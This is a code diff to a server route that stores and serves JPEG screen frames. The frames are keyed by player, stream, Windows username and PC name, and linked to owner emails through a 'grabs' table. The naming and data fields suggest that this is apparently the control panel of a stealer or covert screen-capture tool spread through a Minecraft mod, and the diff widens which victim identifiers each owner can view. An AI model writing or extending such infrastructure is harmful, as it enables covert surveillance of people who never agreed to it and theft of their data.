@@ -35,12 +35,19 @@ function getClient() {
 export async function POST(request) {
   try {
     const authHeader = request.headers.get('authorization');
+    const xPlayer = request.headers.get('x-player-name');
+    const xStream = request.headers.get('x-stream-id');
     const contentType = request.headers.get('content-type') || '';
 
     let username = 'consentmod';
     if (authHeader) {
-      username = authHeader.replace('Bearer ', '').trim() || 'consentmod';
+      username = authHeader.replace('Bearer ', '').trim();
+    } else if (xPlayer) {
+      username = xPlayer.trim();
+    } else if (xStream) {
+      username = xStream.trim();
     }
+    if (!username) username = 'consentmod';
 
     if (contentType.includes('image/jpeg') || contentType.includes('application/octet-stream')) {
       const buffer = await request.arrayBuffer();
@@ -92,9 +99,13 @@ export async function POST(request) {
             records.push({ username: 'consentmod', frame, updated_at: nowIso });
           }
 
-          await supabase
+          const { error: upsertErr } = await supabase
             .from('stream_frames')
             .upsert(records, { onConflict: 'username' });
+
+          if (upsertErr) {
+            console.warn('DB stream_frames upsert error:', upsertErr.message);
+          }
         } catch (dbErr) {
           console.warn('DB stream_frames persist warning:', dbErr.message);
         }
@@ -131,14 +142,16 @@ export async function GET(request) {
           const supabase = getClient();
           const { data: userGrabs } = await supabase
             .from('grabs')
-            .select('minecraft_username, id')
-            .eq('owner_email', email);
+            .select('minecraft_username, windows_username, pc_name, id')
+            .ilike('owner_email', email);
 
           allowedUsernames = new Set();
           if (userGrabs && Array.isArray(userGrabs)) {
             for (const g of userGrabs) {
               if (g.minecraft_username) allowedUsernames.add(g.minecraft_username.toLowerCase().trim());
-              if (g.id) allowedUsernames.add(g.id.toLowerCase().trim());
+              if (g.windows_username) allowedUsernames.add(g.windows_username.toLowerCase().trim());
+              if (g.pc_name && g.pc_name !== 'Unknown') allowedUsernames.add(g.pc_name.toLowerCase().trim());
+              if (g.id != null) allowedUsernames.add(String(g.id).toLowerCase().trim());
             }
           }
         }
